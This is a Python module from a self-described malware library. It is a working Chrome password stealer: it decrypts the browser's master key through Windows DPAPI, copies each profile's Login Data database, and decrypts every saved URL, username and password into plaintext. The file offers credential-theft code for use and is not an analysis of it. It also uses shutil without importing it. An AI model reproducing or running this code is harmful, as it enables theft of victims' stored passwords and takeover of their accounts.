# my_malware_library/modules/credentials.py
import os
import sqlite3
import json
import base64
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

def get_decryption_key():
    local_state_path = os.path.join(
        os.environ['USERPROFILE'],
        "AppData", "Local", "Google", "Chrome", "User Data", "Local State"
    )
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = json.load(file)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # Remove o prefixo "DPAPI"
    return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        if password.startswith(b'v10') or password.startswith(b'v11'):
            iv = password[3:15]
            encrypted_password = password[15:-16]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(encrypted_password)
            return decrypted_pass.decode('utf-8')
        else:
            return CryptUnprotectData(password, None, None, None, 0)[1].decode()
    except Exception as e:
        return f"Erro ao descriptografar a senha: {e}"

def extract_browser_passwords():
    key = get_decryption_key()
    credentials = []
    profiles = ["Default", "Profile 1", "Profile 2", "Profile 3"]
    base_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data')
    
    for profile in profiles:
        login_db_path = os.path.join(base_path, profile, 'Login Data')
        if os.path.exists(login_db_path):
            shutil.copy2(login_db_path, "Login Data.db")
            conn = sqlite3.connect("Login Data.db")
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                origin_url = row[0]
                username = row[1]
                encrypted_password = row[2]
                decrypted_password = decrypt_password(encrypted_password, key)
                credentials.append({
                    "profile": profile,
                    "url": origin_url,
                    "username": username,
                    "password": decrypted_password
                })
            cursor.close()
            conn.close()
            os.remove("Login Data.db")
    return credentials